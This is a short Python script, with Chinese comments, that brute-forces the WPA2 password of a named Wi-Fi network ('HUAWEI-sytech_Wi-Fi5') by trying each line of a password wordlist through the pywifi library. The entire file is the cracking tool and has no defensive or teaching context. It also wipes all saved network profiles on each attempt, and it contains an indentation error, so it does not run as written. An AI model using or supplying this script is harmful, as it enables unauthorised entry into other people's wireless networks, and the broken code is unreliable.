import pywifi
from pywifi import const # 引入一个常量
import time

def wifiConnect(wifiname,wifipassword):
    wifi = pywifi.PyWiFi()
    ifaces = wifi.interfaces()[0]
    ifaces.disconnect()# 断开连接
    time.sleep(0.5)
    if ifaces.status() == const.IFACE_DISCONNECTED:
        profile = pywifi.Profile()# 创建WiFi连接文件
        profile.ssid = wifiname# WiFi的ssid，即wifi的名称
        profile.key = wifipassword# WiFi密码
        profile.akm.append(const.AKM_TYPE_WPA2PSK)# WiFi的加密类型，现在一般的wifi都是wpa2psk
        profile.auth = const.AUTH_ALG_OPEN # 开放网卡
        profile.cipher = const.CIPHER_TYPE_CCMP# 加密单元
        ifaces.remove_all_network_profiles()# 删除所有的WiFi文件
        tep_profile = ifaces.add_network_profile(profile)# 设定新的连接文件
        ifaces.connect(tep_profile) # 连接WiFi
        time.sleep(1.5)
        if ifaces.status() == const.IFACE_CONNECTED:
            return True
        else:
            return False
def main():
    print('开始破解：')
    file = open('pwd.txt','r')#打开密码本
    wifi_name='HUAWEI-sytech_Wi-Fi5'
    while True:
        wifipwd = file.readline()
        print("尝试密码：", wifipwd)
            if (not wifipwd):
                print("尝试密码为空")
                break
        try:
            bool = wifiConnect(wifi_name,wifipwd)
            if bool:
                print('正确密码为：'+wifipwd)
                break
            else:
               print('本次尝试的密码为：%s，状态：密码错误'%wifipwd)
        except:
            print("报错了")
            continue
    file.close()
if __name__=='__main__':
	main()
